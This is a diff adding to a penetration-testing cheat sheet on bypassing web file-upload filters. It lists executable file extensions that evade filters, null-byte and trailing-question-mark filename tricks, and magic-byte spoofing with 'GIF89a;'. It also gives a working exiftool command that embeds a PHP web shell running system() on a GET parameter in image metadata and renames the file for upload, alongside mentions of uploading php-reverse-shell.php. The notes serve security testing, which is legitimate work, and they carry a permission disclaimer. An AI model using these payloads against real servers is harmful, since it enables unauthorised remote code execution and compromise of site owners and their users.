@@ -24,6 +24,10 @@ https://en.wikipedia.org/wiki/List_of_file_signatures
 I added an additional ..... (five) dots so the php payload does not get affected by inserting 25 50 44 46 2D via hexeditor -b, dont forget the -b 
 .....<?php
 /backend/default/uploads/php-reverse-shell.php <----Had to go back and fuzz to find trigger url. /uploads/php-reverse-shell.php
+
+- Use a magic mime type:
+    - https://en.wikipedia.org/wiki/List_of_file_signatures#
+    - Example use "GIF89a;" in a php file
 ```
 
 ```
@@ -34,6 +38,29 @@ so while we have to upload a JPEG file type we actaully can upload a PHAR-JPEG f
 
 And at last Uploading a shell to some random websites for fun is not really cool so don’t ever try untill unless you have the permission to test.
 ```
+```
+Bypass file checks for upload
+- Rename the file
+    - php phtml, .php, .php3, .php4, .php5, and .inc
+    - asp asp, .aspx
+    - perl .pl, .pm, .cgi, .lib
+    - jsp .jsp, .jspx, .jsw, .jsv, and .jspf
+    - Coldfusion .cfm, .cfml, .cfc, .dbm
+
+- PHP bypass trickery (Must be PHP < 5.3)
+    - Add a question mark at the end 
+        - dog.jpg?
+    - NULL BYTE
+        - dog.jpg%00
+        
+
+- exiftool (inject RCE into metadata comment section)
+    > exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
+    > mv lo.jpg lo.php.jpg
+```
+
+
+
 
 **Test PDF upload functionality.**
 - [https://github.com/jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf)
